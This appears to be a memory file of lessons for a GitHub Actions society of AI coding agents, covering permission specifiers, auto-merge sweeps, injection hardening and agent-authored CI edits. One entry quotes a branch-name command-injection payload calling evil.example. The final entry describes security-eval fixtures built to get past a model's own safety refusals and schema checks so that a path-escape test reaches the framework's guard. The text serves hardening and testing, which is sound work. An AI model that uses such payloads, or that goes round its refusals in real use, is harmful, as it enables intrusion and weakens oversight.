bash-tool-wildcard.l0: allowedTools: use Bash(cmd:*) not Bash(cmd) — the bare form blocks all arguments.
bash-tool-wildcard.l1: `Bash(cmd)` matches ONLY the literal command with no args; every invocation WITH args (git checkout -b, gh pr create, npm test) is denied. The correct specifier is `Bash(cmd:*)`. This caused 54–62 turn / $0.98–$1.61 runs that appeared green but produced no PR or label change.
bash-tool-wildcard.value: Apply Bash(cmd:*) for do-workers (git/gh/npm/node) and any ask-worker needing gh. Lint should reject bare Bash(cmd). Runs with ≥5 permission_denials → classify as 'blocked' (RED), not green — classifyRunHealth in src/dev-mesh/health.js. PR #10 (2026-06-15) fixed this across all six dev-mesh workflows.

provenance.source: PR #10: fix(dev-mesh): Bash(cmd:*) so agents can act + gate flags 'ran but blocked'

gitattributes-lf-normalization.l0: CRLF Windows CI flakes: fix at the git layer with .gitattributes, not per-test normalization.
gitattributes-lf-normalization.l1: Without .gitattributes, Windows Git can check out text files with CRLF, breaking regex anchors like /^---\n/ in fixture-reading tests. Patching each test to strip \r is a bandage — the inconsistency keeps producing new failures.
gitattributes-lf-normalization.value: Add `* text=auto eol=lf` + binary pins (*.png *.jpg *.ico) to .gitattributes, then run `git add --renormalize .` to normalize existing tracked files with no content change. This removes a whole class of platform-only surprises at the source. Regression: every checkout now sees identical bytes on Linux, macOS, and Windows. Provenance: PR #11 (the Dev-mesh's first Coder-authored change, closing Issue #3).

provenance.source: PR #11 / Issue #3

curator-actions-pr-bootstrap.l0: Actions opening PRs needs BOTH pull-requests:write YAML AND the repo 'Allow Actions to create PRs' toggle.
curator-actions-pr-bootstrap.l1: The YAML `permissions: pull-requests: write` is necessary but NOT sufficient — the repo setting (Settings → Actions → General → 'Allow GitHub Actions to create and approve pull requests') must also be ON. Without it a workflow pushes the branch but `gh pr create` fails with 403, no error surfaced — the branch sits orphaned with no PR. A one-time bootstrap gap that bites every new repo on first deploy.
curator-actions-pr-bootstrap.value: Before the first Curator / PR-opening run in a new repo, enable Settings → Actions → General → 'Allow GitHub Actions to create and approve pull requests' (the YAML pull-requests:write permission alone is not enough). Symptom of the missing toggle: branches (memory/* or any feature branch) exist in remote with no open PR. Detect by listing branches with no associated PR. Once enabled, future Curator runs open their own PRs with no manual bridge.

provenance.source: PR #12 + #13 — first memory:promote PRs, manually bridged because the repo 'Allow Actions to create PRs' toggle was off at deployment

yaml-flag-drift-structural-lint.l0: Encode YAML flag conventions as structural lints — misconfig must fail CI, not silently corrupt health signal.
yaml-flag-drift-structural-lint.l1: PR #28 hardened `--advisory-blocked`: the ask/do boundary lived only in per-workflow YAML. A do-mode pusher wrongly given `--advisory-blocked` would lose its honest RED without any CI failure. Fix: a lint in `test/dev-mesh-assert-run-healthy.test.js` crosschecks the flag against `Bash(git:*)` (do-mode-pusher proxy) for every workflow calling `assert-run-healthy.mjs`. Tracks exact count (10) — adding/removing a workflow forces a deliberate update.
yaml-flag-drift-structural-lint.value: When a behavioral flag (e.g. `--advisory-blocked`) follows a rule derivable from a YAML property (e.g. whether the role grants `Bash(git:*)`), encode that rule as a hermetic structural lint: (1) iterate all target workflow files; (2) detect the boundary via a proxy heuristic (`isPusher = /Bash\(git:\*\)/.test(wf)`); (3) assert the flag matches (`hasFlag = /script\.mjs[^\n]*--advisory-blocked/.test(wf)`); (4) assert `isPusher ↔ !hasFlag`; (5) guard an exact workflow count so adding/removing a file forces a deliberate update. Run in the standard hermetic test suite so it gates every PR. Document the proxy heuristic's scope (e.g. `Bash(git:*)` only — a broader `Bash` or narrower `Bash(git:push)` would need the pattern updated). Provenance: PR #28 (2026-06-15).

provenance.source: PR #28: test(dev-mesh): lint the advisory-blocked convention against tool grants

automerge-validate-merge-not-head.l0: Automerge: validate MERGE RESULT not stale branch HEAD — stale-but-clean PRs self-heal; HEAD-validation stalls forever.
automerge-validate-merge-not-head.l1: Two bugs in memory auto-merge fixed by PR #42: (1) sweep validated branch HEAD's quick.json — PRs branched before an l0 trim fix carried the old invalid file yet merged cleanly; HEAD-invalid → refused; mergefix only touches DIRTY PRs → permanent stall. Fix: `git merge origin/main` first, validate the merged tree. (2) guard only matched `quick.json`, blocking memory `*.md` workflow docs from ever auto-merging. Fix: allow `quick.json` OR `([^/]+/)?[^/]+\.md` under `dev-mesh/<role>/memory/`, anchored so `.js` etc. still require human review.
automerge-validate-merge-not-head.value: For any auto-merge sweep that validates a file before merging: always simulate the merge first (`git fetch origin main && git merge origin/main --no-edit`) and validate the resulting tree — NOT the branch HEAD. A stale-but-clean branch that would validate after merge is permanently stuck if you validate the HEAD (nothing triggers a refresh since mergefix only touches conflict-DIRTY branches). Also: define the guard regex precisely enough to cover all legitimate file types in the merge target. For the memory auto-merge, `quick.json` alone was too narrow — Curator-authored `workflows/*.md` pattern docs are also inert memory data and must be accepted. Use an anchored ERE that admits subdir depth explicitly (`([^/]+/)?[^/]+\.md`) rather than `.*\.md`, so executable files at arbitrary nesting depth cannot slip through. Provenance: PR #42 (2026-06-15), fixing stale-clean-branch deadlock + guard scope gap.

provenance.source: PR #42: fix(dev-mesh): memory-automerge self-heals stale-clean PRs + accepts memory *.md

timing-race-two-phase-budget.l0: Two-phase timing: anchor KILL_TIMEOUT_MS (15000ms for Windows cold starts), set STARTUP_BUDGET = KILL_TIMEOUT - 500.
timing-race-two-phase-budget.l1: PR #35's fix (STARTUP_BUDGET_MS=5000, KILL_TIMEOUT_MS=7000) proved insufficient: two cold Node starts on a loaded Windows runner take 5-7s, so the 5s budget expired before the grandchild wrote its pid (PR #102, observed twice). Root cause: kill timeout anchored too low (7s). Fix: anchor on a generous kill timeout (15000ms), derive STARTUP_BUDGET_MS = KILL_TIMEOUT_MS - 500 — poll fills nearly the full pre-kill window. Formula direction matters: budget = kill - slack tracks correctly; kill = budget + slack can silently leave an insufficient ceiling.
timing-race-two-phase-budget.value: Pattern: (1) Pick KILL_TIMEOUT_MS generously — 15000ms for tests with two cold Node starts on Windows. (2) Derive STARTUP_BUDGET_MS = KILL_TIMEOUT_MS - 500 (poll for nearly the full pre-kill window). (3) Formula direction matters: anchoring on kill and deriving budget means raising the timeout automatically grows the poll window; the reverse (kill = budget + slack) requires both constants to move together and fails silently if kill is raised but budget is not. Symptom of miscalibration: test duration equals STARTUP_BUDGET_MS exactly (poll expires before pid file appears) even when the kill mechanism is correct — assert fires against incomplete state, not a broken feature. Applies to any test confirming 'state ready' before 'event fires' (pid file, port, lock). Provenance: first fixed in PR #35 (values later proven insufficient); definitively calibrated in PR #102 (2026-06-18, two recurrences on windows-latest/node-20).

provenance.source: PR #102 (2026-06-18): supersedes PR #35 — KILL_TIMEOUT_MS=15000 + STARTUP_BUDGET = KILL_TIMEOUT - 500

gh-actions-ref-injection.l0: Never interpolate attacker-controlled GitHub context (head.ref) into run:/prompt — pass it via an env: var instead.
gh-actions-ref-injection.l1: A collaborator can craft a branch name like `feat/$(curl evil.example)` or embed fake prompt directives. When `${{ head.ref }}` appears directly in a `run:` step or a prompt string it is template-interpolated before the shell sees it, executing the payload. Discovered in the dev-mesh autofix/mergefix workflows before PR #22 hardened them.
gh-actions-ref-injection.value: Structural fix: (1) add `env: PR_BRANCH: ${{ github.event.pull_request.head.ref }}` to each step that needs the ref; (2) use `$PR_BRANCH` (or `$HEAD_REF`) in `run:` and prompt blocks — never the raw `${{ ... head.ref ... }}`; (3) lint-assert that no bare context interpolation of attacker-controlled refs appears in `run:`/prompt blocks. Only integers (PR number) and `env:`/`if:` expressions remain safe for direct interpolation. Provenance: PR #22 (2026-06-15).

provenance.source: PR #22: fix(dev-mesh): structural injection hardening for autofix + mergefix (branch ref via env)

actions-recursion-guard-schedule.l0: Actions recursion guard: GITHUB_TOKEN PRs never trigger pull_request events — use a cron schedule to auto-merge them.
actions-recursion-guard-schedule.l1: When a workflow creates a PR using GITHUB_TOKEN, GitHub's recursion guard blocks all pull_request events on that PR — so a 'merge when checks pass on pull_request: [opened]' trigger never fires. Solution: a scheduled workflow (e.g., every 15 min on cron) that polls for open PRs matching a label+same-repo filter, runs a light validator, and squash-merges. No PAT and no extra repo setting needed beyond merge capability. Structural guards (restrict changed paths) must run inside the scheduled job, not as branch protection, since the PR's check suite may be empty.
actions-recursion-guard-schedule.value:
Pattern for auto-merging GITHUB_TOKEN-opened PRs in GitHub Actions:
1. Label the bot PR at creation (e.g., 'memory:promote').
2. Create a scheduled workflow (cron: '*/15 * * * *') — NOT a pull_request trigger.
3. In the job: query open PRs with the label + same-repo filter (gh pr list --label memory:promote --json number,headRefName,isCrossRepository).
4. Structural guard: verify every changed file is under the expected safe directory (e.g., dev-mesh/*/memory/) — reject any that touch code.
5. Light validation: run a domain-specific validator (not the full test suite — heavy CI would be overkill and delay merges).
6. Squash-merge on pass.
Matching bookend in ci.yml: add paths-ignore for the safe directory so memory-only PRs skip the heavy matrix (unprotected main means no stranded required check). Applied in dev-mesh-memory-automerge.yml. Provenance: PR #21 (2026-06-15).

provenance.source: PR #21: feat(dev-mesh): fully automate memory:promote (light check + auto-merge, skip heavy CI)

github-recursion-guard-poll.l0: GitHub blocks pull_request_review re-triggers from GITHUB_TOKEN → use a cron poll, not an event, for review-respond.
github-recursion-guard-poll.l1: When a workflow posts a review via GITHUB_TOKEN, GitHub's recursion guard prevents that same review from firing the pull_request_review event for another run. An event-driven review-responder would never see its own peers' reviews. The only robust trigger is a scheduled poller (e.g. every 30 min) that queries for PRs in CHANGES_REQUESTED state.
github-recursion-guard-poll.value: Wire review-respond as a scheduled job (cron), not a pull_request_review event listener. Have the Coder read review threads via `gh pr view --json reviews` as untrusted DATA, fix actionable points with minimal edits, commit [review-fix], push — never self-merge. Cap [review-fix] commits per branch (≤2) to bound runaway loops. Completes the self-sustaining mesh loop: idea → build → review → (CHANGES_REQUESTED) → auto-fix → … → human merge. Provenance: PR #23 (2026-06-15).

provenance.source: PR #23: feat(dev-mesh): review-respond — autonomously read & act on review feedback (scheduled)

honesty-gate-role-scoped.l0: Shared gate scripts for mixed roles need per-caller flags: blocked is fatal for do-workers, advisory for ask-roles.
honesty-gate-role-scoped.l1: PR #25 made `blocked` (≥5 denials) globally advisory — too broad. For do-workers (autofix, mergefix, backlog, curate) granted Edit,Write,Bash(git:*), ≥5 denials almost always signals a real misconfigured tool grant (e.g. Bash(git) vs Bash(git:*) — the exact bug the gate exists to catch). PR #26 reverted the global default and added --advisory-blocked, passed ONLY from light/ask callers (review, triage, intake, research) where probe-denials are expected noise. The pure classifier in src/dev-mesh/health.js is unchanged — only the gate's exit policy is per-caller.
honesty-gate-role-scoped.value: When writing a gate script shared by both do-workers and ask-workers: (1) keep `blocked` → exit 1 as the strict default; (2) add an explicit opt-in flag (`--advisory-blocked`) that downgrades to `::warning::` + exit 0; (3) pass the flag ONLY from ask/light-role callers where denials are expected (review, triage, intake, research); (4) do-workers (autofix, mergefix, backlog, curate) pass nothing and stay strict. Never make advisory the global default — do-workers need the gate red when their tool grants are broken. Provenance: PR #26 (2026-06-15), supersedes honesty-gate-blocked-advisory.

provenance.source: PR #26: fix(dev-mesh): scope honesty gate's blocked-advisory to light roles only

event-driven-polling-backstop.l0: Event-driven CI automation must be paired with a scheduled polling backstop — GitHub webhook delivery is not guaranteed.
event-driven-polling-backstop.l1: `dev-mesh-autofix.yml` fires on `check_run` events but a missed/undelivered webhook leaves a red PR untouched. PR #24 added `dev-mesh-ci-sweep.yml` (every 30 min) as the polling backstop. Both share a per-branch `[autofix]` budget cap (≤ 2 commits, counted via `git log --grep`) so they can't double-spend on the same branch. Offset cron (`25,55 * * * *`) avoids thundering-herd with the other sweeps.
event-driven-polling-backstop.value: Whenever you wire a `check_run`/`pull_request`/`push` event-driven workflow, add a scheduled twin at ≤30-min intervals. Let them share a named commit-message marker as the budget token (e.g., `[autofix]`) and grep `base..HEAD` to count spend. Use offset cron minutes so concurrency groups don't all wake at :00. Branch name must flow through `env:` (never shell-interpolated) — injection-safe. Provenance: PR #24 (2026-06-15).

provenance.source: PR #24: feat(dev-mesh): ci-sweep — scheduled reader for failing-CI PRs (backstop to autofix)

fix-then-lint-pattern.l0: Gate-policy runtime fix is step 1 of 2 — always add a lint/test follow-up to statically enforce the new convention.
fix-then-lint-pattern.l1: PR #25 changed `blocked` from fatal→advisory in the honesty gate and updated docs/quick.json. But without a static check, a future edit to assert-run-healthy.mjs can silently revert the exit-code semantics. PR #28 was opened as the lint follow-up: verify ask-role agents' blocked exit policy matches their declared tool grants. The runtime fix without the lint step is incomplete.
fix-then-lint-pattern.value: Two-step pattern: (1) fix runtime gate behavior + document in quick.json; (2) immediately open a follow-up ticket/PR to add a lint rule or test that encodes the new exit-code semantics statically. Apply whenever any gate's status→exit-code mapping changes. Provenance: PR #25 (runtime fix) + PR #27 (lesson promoted) + PR #28 (lint follow-up), 2026-06-15.

provenance.source: PR #27: memory — distill PR #25 honesty-gate blocked-advisory lesson

multi-bot-shared-file-conflicts.l0: Multiple bots writing memory PRs concurrently conflict on shared files (quick.json) — auto-resolve once via mergefix.
multi-bot-shared-file-conflicts.l1: PR #12 was blocked when two memory PRs both touched quick.json at the same time. The systemic fix (PR #16) is dev-mesh-mergefix.yml: on every main update, detect DIRTY same-repo PRs → merge main → auto-resolve (quick.json: union both sides' keys; code: minimal combined result; unresolvable: abort + comment) → commit [mergefix] → push. Safety: ≤2 [mergefix] commits per branch (branch-only count, excluding merged history), no force-push, no auto-merge, same-repo only. GITHUB_TOKEN pushes don't re-trigger the workflow so there is no loop.
multi-bot-shared-file-conflicts.value: When the dev-mesh gains new agents that write to shared memory files, conflicts are expected and self-heal via mergefix without manual intervention. For quick.json, key-union resolution ensures no lesson is silently dropped. The human merge gate is preserved. Track the [mergefix] commit count per branch (≤2) as the bounded-safety invariant.

provenance.source: PR #16: feat(dev-mesh): mergefix — auto-resolve PRs that conflict with main

memory-cap-validate-at-write.l0: Validate quick.json caps at write time (Curator workflow), not only at auto-merge — over-cap l0s deadlock the pipeline.
memory-cap-validate-at-write.l1: PR #44: 9 stalled memory:promote PRs piled up because three had l0 fields >120 chars — auto-merge refused them, mergefix cannot fix validation failures, PRs were permanently stuck. Root cause: validate-quick-memory.mjs ran at auto-merge but not at Curator write time. PR #66 wired the validator into dev-mesh-curate.yml BEFORE git push — fail fast at source. Prevention at write time is always cleaner than post-hoc recovery.
memory-cap-validate-at-write.value: (1) Wire `node scripts/validate-quick-memory.mjs dev-mesh/curator/memory/quick.json` in dev-mesh-curate.yml AFTER claude-code-action commits quick.json, BEFORE git push — abort on non-zero (PR #66 wired this; PR #44 first documented the gap). (2) Recovery from deadlock (N conflicting + invalid PRs): list open memory/* branches, read each PR quick.json diff, dedup+trim to caps, fold into one consolidation PR, close stale PRs. (3) Mergefix handles CONFLICTS (key-union) but not validation FAILURES — write-time guard is the only robust pipeline protection.

provenance.source: PR #44 (origin) + PR #66 (implementation): validate quick.json caps at Curator write time

test-dynamic-discovery-over-lists.l0: Enumerate test subjects dynamically (glob/readdir) — hardcoded role lists silently miss newly added entries.
test-dynamic-discovery-over-lists.l1: PR #40 closed a structural gap: `dev-mesh-memory.test.js` validated quick.json for `['coder', 'triager']` only, missing curator. Curator's over-cap entries passed CI silently for multiple PRs before being caught. Fix: `readdirSync` + `existsSync` to enumerate roles dynamically; guard with `assert.ok(length > 0)` to prevent vacuous pass if the glob returns nothing.
test-dynamic-discovery-over-lists.value: Pattern for any test over parallel-structured files (per-role, per-agent, per-module): (1) Discover: readdirSync + existsSync to enumerate directories that have the target file — no hardcoded list. (2) Guard: assert discovered.length >= EXPECTED_MIN so an empty result doesn't silently vacuously pass. (3) Validate each discovered entry in a loop. Applies whenever the subject set can grow over time (roles, agents, modules, plugins). Provenance: PR #40 / Issue #39 (2026-06-15).

provenance.source: PR #40: test(dev-mesh): validate all roles' quick.json in the hermetic suite (#39)

quick-json-supersede-delete.l0: Delete superseded quick.json entries: valid_to set breaks isLive() CI gate when dynamic role discovery runs.
quick-json-supersede-delete.l1: PR #40 changed dev-mesh-memory.test.js to discover roles dynamically — previously only coder/triager were validated. Once curator was included, isLive() caught honesty-gate-blocked-advisory (status:'superseded', valid_to set) that had sat since PR #26. Fix (PR #50): delete the entry outright — the seed file must contain only live entries (status:'active', valid_to:null). The replacement (honesty-gate-role-scoped) was already active. Superseded entries are never injected and break the CI gate.
quick-json-supersede-delete.value: Supersession is a two-step operation: (1) add the replacement entry (status:'active', valid_to:null); (2) DELETE the old entry from quick.json in the same PR. Do NOT leave it as status:'superseded' with valid_to set — isLive() in dev-mesh-memory.test.js requires every persisted entry to be live. The 'mark it and leave it' pattern compiles silently until dynamic role discovery expands coverage (as PR #40 did), at which point the stale entry causes an immediate CI failure. The replacement's provenance captures historical context; no information is lost by deleting. Pattern: distill replacement → write replacement entry → delete old key → open memory:promote PR. Provenance: PR #50 (2026-06-15), closing Issue #48.

provenance.source: PR #50: fix(dev-mesh): remove superseded honesty-gate-blocked-advisory from curator quick.json

drift-check-content-not-names.l0: Registry drift check must compare full content not just names — stale paths pass name-match and bypass regeneration.
drift-check-content-not-names.l1: PR #49 fix: `doctor.js` compared only peer names when checking if a managed registry was stale. Relocating a mesh left all embedded absolute paths wrong while names still matched → no regeneration triggered → `delegate_to_peer` failed with opaque `caller_identity_unresolved`. The refusal in `peer-bridge.js` now includes the `meshRoot` and `agentRoot` paths it tried, plus a `run agent-mesh doctor` hint. Root: generated artifacts capture absolute paths at generation time; name-only equality misses path/env/arg drift entirely.
drift-check-content-not-names.value: When writing drift/staleness detectors for generated artifacts that embed absolute paths: (1) compare full serialized content of each peer object (paths, env vars, args), not just identifiers. (2) Normalize both sides (e.g. sort keys) before comparison so field-order differences don't produce false positives. (3) Apply to any generated file — registry.json, mcp.json, wiring — where paths are captured at generation time and can drift on relocation (mesh moved, copied, or re-initialized under a different absolute path). (4) Pair any identity-resolution failure with a diagnostic that includes the paths tried and a repair hint (`agent-mesh doctor`). Quick test: seed a registry with correct names but stale absolute paths, verify dry-run flags it, verify apply regenerates it. Provenance: PR #49 (2026-06-15), fixing Issue #47.

provenance.source: PR #49: fix: detect registry path drift on relocation; improve caller_identity_unresolved diagnostic

github-token-workflow-write-blocked.l0: GITHUB_TOKEN cannot write .github/workflows/** — do-workers need DEV_MESH_PAT (Workflows:RW) for self-editable CI.
github-token-workflow-write-blocked.l1: GitHub rejects GITHUB_TOKEN pushes to .github/workflows/** (only PATs/GitHub Apps with Workflows:RW scope can write there). Without a PAT, a Coder writing and testing a workflow fix cannot push it — the ephemeral runner discards the branch and the issue deadlocks with a report but no PR (bugs #38 and #41). Fix: DEV_MESH_PAT || GITHUB_TOKEN fallback chain in every do-worker that may touch CI. curate must stay on GITHUB_TOKEN only — removing the recursion guard breaks the memory auto-merge loop.
github-token-workflow-write-blocked.value: Add a fine-grained PAT (Contents:RW, Pull requests:RW, Workflows:RW, scoped to this repo only) as repo secret DEV_MESH_PAT. Wire do-workers (backlog, autofix, mergefix, review-respond) as `secrets.DEV_MESH_PAT || secrets.GITHUB_TOKEN` — PAT when present, GITHUB_TOKEN otherwise; fully non-breaking until the secret is created. curate must stay on GITHUB_TOKEN only: its memory:promote PRs rely on GitHub's recursion guard (GITHUB_TOKEN PRs don't re-fire pull_request events). Add .github/CODEOWNERS gating .github/workflows/** on owner review — the mesh can now author changes to its own CI harness, so the human merge gate must be explicit and specific. Pin the full wiring as a standalone hermetic lint (test/dev-mesh-pat-wiring.test.js). PAT pushes re-trigger workflows — bounded by existing per-PR budget caps (see actions-recursion-guard-schedule). Provenance: PR #53 (2026-06-16), fixing Issue #38 + #41.

provenance.source: PR #53: chore(dev-mesh): let do-workers self-edit workflows via DEV_MESH_PAT + CODEOWNERS gate

doctor-bridge-env-stamp.l0: doctor syncBridgeMcp must stamp MESH_ROOT/MESH_CEILING in .mcp.json — plain sessions have no other env source.
doctor-bridge-env-stamp.l1: PR #54: syncBridgeMcp wrote the agentmesh_peerbridge entry to .mcp.json with no env block. Dashboard/worker spawns inject MESH_ROOT/MESH_CEILING separately so they work. A direct folder session reads only .mcp.json — bridge starts env-blind, resolveCallerName returns null, and every delegate_to_peer fails as caller_identity_unresolved despite a correct registry.
doctor-bridge-env-stamp.value: Whenever mesh tooling writes an MCP server entry to .mcp.json (doctor syncBridgeMcp or equivalent), embed the reserved env the framework passes at runtime: AGENT_MESH_MESH_ROOT (<mesh>/mesh) and AGENT_MESH_MESH_CEILING (mesh root). Direct sessions consume only .mcp.json — they have no other env source for these keys. Dashboard/worker spawns inject them separately (masking the gap during testing). Assert the synced entry carries the env block in tests. Provenance: PR #54 (2026-06-15).

provenance.source: PR #54: fix(doctor): stamp mesh env on synced peer-bridge .mcp.json entry

claude-code-action-push-unsupported.l0: claude-code-action@v1 rejects push event — guard claude steps with && github.event_name != 'push'.
claude-code-action-push-unsupported.l1: When a workflow triggers on: push: alongside schedule, claude-code-action@v1 raises "Unsupported event type: push" if a push-triggered run reaches the claude step — the agent never runs. Push events are fine for discovery steps (find conflicting PRs, detect state) but cannot drive the Action itself. PR #56 fixed dev-mesh-mergefix.yml: the Drive Coder step gained && github.event_name != 'push' in its if: condition; push runs skip cleanly while the hourly schedule backstop continues to invoke the agent. Lint in test/dev-mesh-mergefix.test.js statically enforces the guard.
claude-code-action-push-unsupported.value:
Pattern: any workflow with on: push: that calls claude-code-action must gate the claude step with github.event_name != push. The push trigger remains useful for fast discovery (find a conflicting PR, detect a failing check) but must not drive the Action — if it reaches the Action the run fails with Unsupported event type: push and aborts entirely.

Concrete steps:
1. Add && github.event_name != push to the Drive Coder step if: expression.
2. Confirm Verify step has if: always() && steps.claude.outcome != skipped so it also skips cleanly.
3. Add a hermetic lint assertion that the if: expression contains github.event_name != push (pattern in test/dev-mesh-mergefix.test.js).

Related: event-driven-polling-backstop (schedule backstop pattern), actions-recursion-guard-schedule (GITHUB_TOKEN recursion). Provenance: PR #56 (2026-06-16), closing Issue #38.

provenance.source: PR #56: fix(dev-mesh): skip Drive Coder on push event (Closes #38)

paths-ignore-suppresses-validate-jobs.l0: paths-ignore at the trigger level silently suppresses ALL jobs — use per-job label-based if: for expensive-only skips.
paths-ignore-suppresses-validate-jobs.l1: validate-memory job (PR #59/Issue #41) catches over-cap quick.json at PR time. paths-ignore at the workflow trigger would have suppressed it for the memory:promote PRs it must guard. Fix: leave validate-memory unconditional; add label-based if: only on the heavy matrix job. Cascade: gate the test job on if: needs.matrix.result == 'success' so it skips cleanly when matrix is skipped.
paths-ignore-suppresses-validate-jobs.value: Pattern: (1) Validation jobs that must run for special PRs must be unconditional — no paths-ignore. (2) Skip expensive jobs via per-job label if:, not trigger paths-ignore. (3) Gate dependent jobs on needs.X.result == 'success' so they skip cleanly when parent skips. (4) Use bash arrays not ls for CI file globs — avoids SC2012 word-splitting. Provenance: PR #59 (2026-06-16).

provenance.source: PR #59: ci: add validate-memory job; gate heavy matrix by label not paths-ignore (#41)

ci-sweep-silent-skip-antipattern.l0: CI sweeps that match nothing must post a comment — silent skip leaves PR authors with no signal and stalls the queue.
ci-sweep-silent-skip-antipattern.l1: PR #67: the automerge sweep's no-quick.json branch silently re-skipped every cycle. An .md-only PR sat indefinitely with no comment and no merge path. Fix: detect empty glob explicitly (`[[ ! -e "${qjs[0]}" ]]`) and post a PR comment naming what is missing. Applies to any CI sweep with a conditional skip — missing files, no matching PRs, pre-condition not met. Pattern: (1) detect skip condition; (2) post comment; (3) continue. Never assume re-running a sweep on unchanged state produces new results.
ci-sweep-silent-skip-antipattern.value: For any scheduled or event-driven CI sweep that may conditionally skip a PR: (1) detect the skip condition EXPLICITLY (bash: `[[ ! -e "${arr[0]}" ]]` for empty glob; `[[ -z "$list" ]]` for empty string); (2) post a PR comment that names the reason and what action is needed ('no quick.json found — needs a human'); (3) continue to next PR without attempting a merge. Never silently `continue` — the author has no signal and the PR stalls in the sweep queue indefinitely. This is distinct from 'nothing to do' (e.g. PR is up-to-date): a truly unprocessable PR must say so. Applies to: automerge, autofix, ci-sweep, mergefix, any sweep that conditionally skips. Also: combine with the bash-array pattern (not unquoted $var expansion) so the empty-check is reliable. Provenance: PR #67 (2026-06-16), A2A-authored seam probe; Reviewer finding C.

provenance.source: PR #67: fix(dev-mesh): quote validator args in memory-automerge (A2A-authored seam probe)

SessionStart hook fails open so board unavailability doesn't break interactive sessions.

dev-mesh-two-meshes-distinction.l0: Dev-mesh (GitHub Actions society) ≠ A2A peer mesh (product) — state this up front or agents misuse protocols.
dev-mesh-two-meshes-distinction.l1: PR #61 added dev-mesh/README.md because no document explained the two co-existing layers: Dev-mesh is a GitHub Actions CI/CD society (Maintainer/Analyst/Triager/Coder/Tester/Reviewer/Curator) coordinated via GitHub state (issues/PRs/labels/quick.json memory); A2A peer mesh is the product the society builds (serve-a2a, delegate_to_peer). The Dev-mesh does NOT use A2A delegate_to_peer internally. Without this distinction, agents conflate coordination protocols or misroute work between layers.

Also include: full agent roster table (workflow → role), lifecycle labels as the hand-off protocol, the canonical loop (idea → approved → build → review → merge → distill), and two human gates (approve / merge). claude-code-action-push-inside-step.l0: claude-code-action@v1 does commit+push+PR INSIDE the Action step — a post-step YAML cannot gate 'before push'.
claude-code-action-push-inside-step.l1: PR #69 Reviewer finding (Issue #63): adding a YAML step after claude-code-action@v1 in curate.yml does not provide 'before git push' validation. The Curator agent commits, pushes, and opens the memory:promote PR INSIDE the Action step via Bash(git:*)/Bash(gh:*). Any YAML step after runs after the PR already exists — it cannot abort the push, and is redundant with the automerge gate (dev-mesh-memory-automerge.yml).
claude-code-action-push-inside-step.value:
Pre-push validation for curator-committed content must be embedded in the agent prompt or system config, NOT placed as a YAML step after claude-code-action@v1. The agent does all work (git commit, git push, gh pr create) INSIDE the Action step; any YAML step after runs retroactively against an already-pushed branch.

For curate.yml: embed validate-quick-memory.mjs in the Curator system prompt as a mandatory pre-PR check the agent runs before gh pr create (agent self-aborts on violation). The robust merge-time gate (dev-mesh-memory-automerge.yml) remains the correct enforcement point — do not attempt to replace it with a post-action step.

Applies to any workflow where claude-code-action is the 'do-worker' and also handles the git push. Provenance: PR #69 / Issue #63 (2026-06-17).

bash-tool-simple-expansion-hoist.l0: $VAR simple_expansion blocked in agent Bash — hoist git branch ops (checkout/merge/push) to plain YAML run: steps.
bash-tool-simple-expansion-hoist.l1: PR #70: mergefix agent's first Bash call was `echo "PR_BRANCH=$PR_BRANCH"` — rejected by Bash tool simple_expansion filter. `git checkout "$PR_BRANCH"` also blocked. Agent accumulated 5 denials, flagged unhealthy. Fix: add a YAML run: step BEFORE Drive Coder — checkout + git merge + set CONFLICTS_FOUND in $GITHUB_ENV. Agent only edits conflict files and commits, no branch env vars needed. Post-agent YAML step does `git push origin HEAD:$PR_BRANCH`. Guard both Merge and Drive Coder steps with github.event_name != 'push' (push events have no conflicting PR).
bash-tool-simple-expansion-hoist.value:
Pattern: when an agent needs git branch operations involving shell env-var expansion ($BRANCH, $REF), do NOT put them in the agent's Bash tool calls — simple_expansion is blocked.

Three-step YAML split:
1. Pre-agent run: step — checkout the branch (`git checkout "$HEAD_REF"`), merge main (`git merge origin/main`), detect conflicts (`git ls-files -u | grep -q .`), set CONFLICTS_FOUND in $GITHUB_ENV. Distinguish real conflicts (exit 1 + unresolved files) from hard git errors (exit 128+) — fail the step on the latter.
2. Drive Coder step — guarded by `if: env.CONFLICTS_FOUND == 'true' && github.event_name != 'push'`. Agent receives a clean conflict state; it opens and resolves conflicted files using Edit/Write, stages with `git add -u` (or lets the agent decide), commits. No branch env vars needed.
3. Post-agent run: step — `git push origin "HEAD:$PR_BRANCH"` (plain YAML; guarded by steps.claude.outcome == 'success').

Also: add `if: github.event_name != 'push'` to the Merge step — push events have no conflicting PR to resolve (see claude-code-action-push-inside-step for why Drive Coder already has this guard). Lint-assert both guards in the test suite. Related: gh-actions-ref-injection (use env: for untrusted refs — injection-safe side of the same pattern). Provenance: PR #70 (2026-06-17), closing Issue #65.

provenance.source: PR #70 (2026-06-17): fix: move git branch ops before agent to avoid simple_expansion blocks (closes #65)

security-eval-layer-targeting.l0: Security eval fixtures: cooperate past outer safety layers to reach the target framework enforcement layer.
security-eval-layer-targeting.l1: PR #79 fixed three L3 adversarial fixture bugs — all the same pattern: (I5) malicious registry.json written post-seed polluted pre-run git state (noExternalWrite false-positive); fix: rawRegistry escape hatch commits it in the seed. (I3) relative escape path ../B/x.txt was refused by model safety heuristics before path-guard fired; fix: absolute path + win32 skip. (I6) enum:['ask'] in delegate_to_peer JSON Schema blocked mode:'do' before the runtime gate; fix: loosen to minLength:1, gate stays.
security-eval-layer-targeting.value:
Three layered-defense fixture anti-patterns to avoid:

(1) Dirty git state poisons pre-run change detection. Any fixture file written AFTER buildMesh's seed commit appears as untracked/modified, causing noExternalWrite() to see 'already dirty' as a false positive. Fix: committed malicious fixtures must ride the seed commit via buildMesh's rawRegistry escape hatch (or equivalent) — never written manually post-seed.

(2) Relative escape paths trigger model safety heuristics, not the path-guard. A task like 'write to ../B/x.txt' is refused by the model before the path-guard hook fires. Use the absolute path to the sibling root so the model cooperates down to the framework layer under test. On Windows, do-mode is refused by managed-policy preflight without AGENT_MESH_ATTEST_MANAGED_COMPATIBLE — add a win32 skip for path-guard do-mode tests.

(3) JSON Schema enum restriction can block the model from supplying a 'bad' argument. In delegate_to_peer, mode: { enum: ['ask'] } prevented the model from passing mode:'do' — schema validation fired before the bridge's runtime mode_disabled refusal. Fix: loosen to { type: 'string', minLength: 1 }; the runtime gate remains enforcement and is covered deterministically by unit tests.

General rule: design each security eval scenario so the fixture cooperates past every outer layer (model refusals, schema validation, dirty git state, managed-policy preflight) and the framework's own enforcement is the FIRST thing that fires. Provenance: PR #79 (2026-06-18), fixing Issue #77.

provenance.source: PR #79: fix: L3 adversarial battery I3/I5/I6 security invariant failures

